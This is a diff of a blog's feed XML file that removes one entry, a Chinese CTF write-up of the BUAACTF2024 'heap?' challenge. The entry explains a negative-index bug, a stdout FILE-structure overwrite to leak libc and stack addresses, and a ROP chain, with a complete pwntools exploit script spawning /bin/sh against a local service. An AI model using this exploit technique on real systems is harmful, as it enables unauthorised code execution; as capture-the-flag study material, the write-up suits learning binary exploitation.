@@ -4,33 +4,6 @@
   
   
   <entry>
-    <title>BUAACTF2024 heap? wp</title>
-    <link href="/2024/04/29/BUAACTF-heap-wp/"/>
-    <url>/2024/04/29/BUAACTF-heap-wp/</url>
-    
-    <content type="html"><![CDATA[<p>临时出的一道防AK的，这次校赛题出简单了，反省</p><span id="more"></span><p>洞很简单，就是idx没查负数</p><h2 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h2><p>利用idx&#x3D;-8改stdout</p><ul><li>_flags&#x3D;0xfbad1887，改stdout的缓冲方式</li><li>_IO_write_base改到stdout的_chain，输出stdin的地址，用的libc stdout的最低字节为0x03，改一字节改不到，改两字节需要爆破十六分之一</li></ul><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>用和Leak一样的方法可以泄漏_environ来获取栈地址，然后在栈上写ROP链</p><p><em>之前遇到这种情况我都是打IO，非常麻烦，之前看别人的wp可以直接打栈，简简又单单🤡</em></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><ul><li>先申请idx为8的chunk再delete，令size[-8]&#x3D;note[8]&#x3D;0xdead，再改stdout泄漏libc和_environ</li><li>申请idx为0xf的chunk，这是为了伪造size</li><li>申请idx为-1，size为stack（要写rop链的地址）的chunk，令size[-1]&#x3D;note[0xf]&#x3D;stack</li><li>改idx为0xf的chunk就能rop了</li></ul><p>有十六分之一的爆破，多打几遍，看你运气：）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">8</span>)<br>payload=p64(<span class="hljs-number">0xfbad1887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\xe8\x47&#x27;</span><br>edit(-<span class="hljs-number">8</span>,payload)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>environ=libcbase+libc.symbols[<span class="hljs-string">&#x27;_environ&#x27;</span>]<br>edit(-<span class="hljs-number">8</span>,p64(<span class="hljs-number">0xfbad1887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(environ)+p64(environ+<span class="hljs-number">8</span>))<br>stack=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x140</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>add(<span class="hljs-number">0xf</span>,<span class="hljs-number">0x200</span>)<br>add(-<span class="hljs-number">1</span>,stack)<br>rdi=libcbase+<span class="hljs-number">0x2a3e5</span><br>binsh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>ret=libcbase+<span class="hljs-number">0x29139</span><br>payload=p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>edit(<span class="hljs-number">0xf</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-    <categories>
-      
-      <category>CTF</category>
-      
-      <category>wp</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>wp</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>CVE-2017-1002101</title>
     <link href="/2024/04/14/cve-2017-1002101/"/>
     <url>/2024/04/14/cve-2017-1002101/</url>
